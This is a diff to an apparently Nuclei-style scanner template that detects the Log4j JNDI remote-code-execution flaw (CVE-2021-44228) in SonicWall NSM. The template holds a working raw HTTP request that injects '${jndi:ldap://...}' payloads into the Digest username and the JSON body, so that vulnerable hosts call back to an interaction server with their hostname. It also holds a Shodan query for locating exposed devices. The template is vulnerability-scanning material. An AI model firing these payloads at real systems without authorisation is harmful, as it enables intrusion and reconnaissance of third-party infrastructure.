@@ -2,7 +2,7 @@ id: sonicwall-nsm-log4j-rce
 
 info:
   name: Sonicwall NSM - Remote Code Execution (Apache Log4j)
-  author: shaikhyaser, yaser_s
+  author: shaikhyaser
   severity: critical
   description: |
     Sonicwall NSM is susceptible to Log4j JNDI remote code execution. SonicWall Network Security Manager (NSM) allows you to centrally orchestrate all firewall operations error-free, see and manage threats and risks across your firewall ecosystem from one place, and stay connected and compliant.
@@ -14,12 +14,14 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
-    verified: true
+    shodan-query: title:"SonicWall Network Security"
     max-request: 1
-  tags: cve,cve2021,rce,jndi,log4j,soniwall,oast,kev
+  tags: cve,cve2021,rce,jndi,log4j,sonicwall,oast,kev
+
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
 
 http:
   - raw:
@@ -27,15 +29,14 @@ http:
         POST /api/sonicos/auth HTTP/1.1
         Host: {{Hostname}}
         X-Snwl-Timer: no-reset
-        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
+        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
         Content-Type: application/json
         Accept: application/json, text/plain, /
         X-Snwl-Api-Scope: extended
         Origin: {{RootURL}}
-        Referer: {{RootURL}}/
-        Connection: close
+        Referer: {{RootURL}}
 
-        {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}"}
+        {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
 
     matchers-condition: and
     matchers:
@@ -47,25 +48,21 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
       - type: kval
         kval:
-          - interactsh_ip
-          - interactsh_ip
+          - interactsh_ip # Print remote interaction IP in output
 
       - type: regex
         group: 2
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
         part: interactsh_request
 
       - type: regex
         group: 1
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
         part: interactsh_request
